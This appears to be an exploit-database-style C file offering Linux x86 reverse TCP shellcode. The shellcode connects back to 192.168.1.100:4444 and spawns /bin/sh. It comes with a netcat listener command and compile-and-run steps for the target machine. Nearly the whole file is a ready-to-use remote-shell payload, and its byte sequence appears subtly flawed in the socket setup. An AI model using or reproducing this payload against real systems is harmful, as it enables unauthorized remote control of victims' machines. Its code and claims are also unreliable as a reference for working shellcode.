/*
# Exploit Title: Linux/x86 - Reverse TCP Shellcode (95 bytes)
# Date: 2025-04-06
# Exploit Author: Al Baradi Joy
# Platform: Linux x86
# Type: Shellcode
# Shellcode Length: 95 bytes
# Tested On: Kali Linux x86
# Connect-Back IP: 192.168.1.100
# Connect-Back Port: 4444

Description:
This is a null-free reverse TCP shell shellcode for Linux x86 that connects back to 192.168.1.100:4444 and spawns a /bin/sh shell. Useful in remote code execution exploits for getting a remote shell.

Usage:
Start a netcat listener on your attacking machine:
    nc -lvnp 4444

Compile and run on the target machine:
    gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
    ./shellcode
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"      // zero out registers
"\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66"  // socket syscall
"\xcd\x80\x89\xc6\x31\xc0\x68\xc0\xa8\x01\x64"  // push IP: 192.168.1.100
"\x66\x68\x11\x5c"                      // push port 4444
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56"
"\x89\xe1\xb0\x66\xb3\x03\xcd\x80"      // connect
"\x31\xc9\xb1\x02\x89\xf3\xb0\x3f"      // dup2 loop
"\xcd\x80\x49\x79\xf9"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xb0\x0b\xcd\x80";     // execve("/bin/sh")

int main() {
    printf("Shellcode Length: %zu\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}